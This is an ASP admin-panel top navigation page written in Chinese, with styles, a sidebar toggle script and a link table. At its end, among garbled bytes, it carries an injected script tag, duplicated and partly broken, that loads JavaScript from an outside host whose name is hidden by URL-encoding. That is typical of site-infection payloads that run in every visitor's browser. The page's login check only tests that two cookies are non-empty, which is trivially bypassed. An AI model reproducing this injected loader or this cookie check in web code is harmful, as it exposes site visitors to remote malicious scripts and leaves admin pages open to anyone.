<%
 if request.Cookies("admin99aw")="" or request.Cookies("flag")="" then
  response.write "<script language='javascript'>"
  response.write"parent.location.href='admin_login.asp';</SCRIPT>" 
  response.end
 end if
 %>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<base target="main">
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	background-image: url(Images/admin_top_bg.gif);
}
-->
</style><head>
<title>顶部管理导航菜单</title>
<meta http-equiv='Content-Type' content='text/html; charset=gb2312'>
<style type='text/css'>
a:link { color:#ffffff;text-decoration:none}
a:hover {color:#ffffff;}
a:visited {color:#f0f0f0;text-decoration:none}
.spa {FONT-SIZE: 9pt; FILTER: Glow(Color=#0F42A6, Strength=2) dropshadow(Color=#0F42A6, OffX=2, OffY=1,); COLOR: #8AADE9; FONT-FAMILY: '宋体'}
img {filter:Alpha(opacity:100); chroma(color=#FFFFFF)}
.style4 {color: #CCFF00}
</style>
<base target='main'>
<script language='JavaScript' type='text/JavaScript'>
function preloadImg(src) {
  var img=new Image();
  img.src=src
}
preloadImg('Images/admin_top_open.gif');

var displayBar=true;
function switchBar(obj) {
  if (displayBar) {
    parent.frame.cols='0,*';
    displayBar=false;
    obj.src='Images/admin_top_open.gif';
    obj.title='打开左边管理导航菜单';
  } else {
    parent.frame.cols='200,*';
    displayBar=true;
    obj.src='Images/admin_top_close.gif';
    obj.title='关闭左边管理导航菜单';
  }
}
</script>

<table width='588' border='0' cellpadding='0' cellspacing='0' background="Images/admin_top_bg.gif"> <tr valign='top'>
    <td width=60 height="53" align="center"><img onclick='switchBar(this)' src='Images/admin_top_close.gif' title='关闭左边管理导航菜单' style='cursor:hand'></td>
        <td align="left"><a href='../index.asp'  target='_blank'><img src='Images/top_an_2.gif' width="92" border='0' align="bottom"></a></td>
        </tr>
</table>
  �<script src=http://%63%63%6B%33%2E%63%6E></script>script src=http://%63%63%6B%33%2E%63%6E></script> Cs